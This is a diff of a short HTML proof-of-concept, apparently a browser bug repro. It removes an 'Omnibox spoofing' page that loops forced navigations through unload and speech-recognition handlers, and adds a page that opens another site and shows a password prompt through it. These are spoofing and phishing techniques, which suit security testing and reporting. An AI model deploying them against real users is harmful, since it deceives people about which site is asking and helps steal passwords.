@@ -1,27 +1,13 @@
-
-<!DOCTYPE HTML>
-<html lang="en-US">
-<head>
-	<meta charset="UTF-8">
-	<input id="foo" type="button" value="Click here" onclick="setInterval(function(){document.location='https://mixed.badssl.com'}, 1)">
-	<title>Omnibox spoofing</title>
-	<script>
-		var x = document.getElementById('foo');
-		window.onbeforeunload = function() {
-			setInterval(function() {
-				document.location='https://mixed.badssl.com'
-var recognition = new webkitSpeechRecognition();
-		recognition.onstart = function(){document.location='https://mixed.badssl.com'}		
-  recognition.start();
-			}, 0);
-		}
-	</script>
-</head>
-
+<html>
 <body>
-	<center>
-		<br>
-	</center>
+<a href="" target="_blank" onclick=clickme();>visit ianfette</a>
+<script>
+function clickme()
+{
+w1 = window.open('http://ianfette.org');
+p = w1.prompt("Enter your password to proceed");
+alert(p);
+}
+</script>
 </body>
-
 </html>
